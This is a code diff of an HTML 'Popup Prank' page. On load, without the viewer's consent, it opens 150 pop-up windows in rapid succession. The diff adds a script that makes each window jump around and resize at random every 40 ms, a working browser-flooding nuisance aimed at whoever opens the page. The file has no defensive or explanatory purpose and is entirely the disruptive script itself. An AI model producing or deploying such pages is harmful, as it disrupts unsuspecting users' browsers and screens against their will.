@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Prank</title>
+    <title>Popup Prank</title>
 </head>
 
 <body>
 
 <script>
-const TOTAL = 150;
+const TOTAL_WINDOWS = 150;
 let opened = 0;
 
 function startPrank() {
+
     function openNext() {
-        if (opened >= TOTAL) {
-            return;
-        }
+
+        if (opened >= TOTAL_WINDOWS) return;
 
         const width = 300;
         const height = 200;
 
-        const left = Math.random() * (screen.width - width);
-        const top = Math.random() * (screen.height - height);
+        const left = Math.random() * Math.max(1, screen.availWidth - width);
+        const top = Math.random() * Math.max(1, screen.availHeight - height);
 
         const popup = window.open(
             "",
@@ -31,20 +31,23 @@ function startPrank() {
         if (!popup) {
             document.body.innerHTML = `
                 <h1>Pop-ups are blocked</h1>
-                <p>Allow pop-ups for this site and reload the page.</p>
+                <p>Allow pop-ups for this website and reload the page.</p>
             `;
             return;
         }
+
+        const number = opened + 1;
 
         popup.document.write(`
             <!DOCTYPE html>
             <html>
             <head>
-                <title>MathIsFun ${opened + 1}</title>
+                <title>PRANK ${number}</title>
             </head>
 
             <body style="
                 margin:0;
+                overflow:hidden;
                 background:#${Math.floor(
                     Math.random() * 16777215
                 ).toString(16).padStart(6, "0")};
@@ -53,7 +56,46 @@ function startPrank() {
                 text-align:center;
             ">
 
-                <h1>PRANK ${opened + 1}</h1>
+                <h1>PRANK ${number}</h1>
+
+                <script>
+                    function chaos() {
+                        try {
+                            // Random size
+                            const newWidth =
+                                Math.floor(Math.random() * 500) + 100;
+
+                            const newHeight =
+                                Math.floor(Math.random() * 400) + 80;
+
+                            // Random position
+                            const maxX =
+                                Math.max(0, screen.availWidth - newWidth);
+
+                            const maxY =
+                                Math.max(0, screen.availHeight - newHeight);
+
+                            const newX =
+                                Math.random() * maxX;
+
+                            const newY =
+                                Math.random() * maxY;
+
+                            window.moveTo(newX, newY);
+
+                            window.resizeTo(
+                                newWidth,
+                                newHeight
+                            );
+
+                        } catch (error) {
+                            // Browser may restrict movement/resizing.
+                        }
+                    }
+
+                    // VERY fast movement and resizing
+                    setInterval(chaos, 40);
+                <\/script>
 
             </body>
             </html>
@@ -63,13 +105,13 @@ function startPrank() {
 
         opened++;
 
-        setTimeout(openNext, 100);
+        // Rapidly create the next popup
+        setTimeout(openNext, 75);
     }
 
     openNext();
 }
 
-// Automatically attempt to start when the page loads
 window.addEventListener("load", startPrank);
 </script>
 
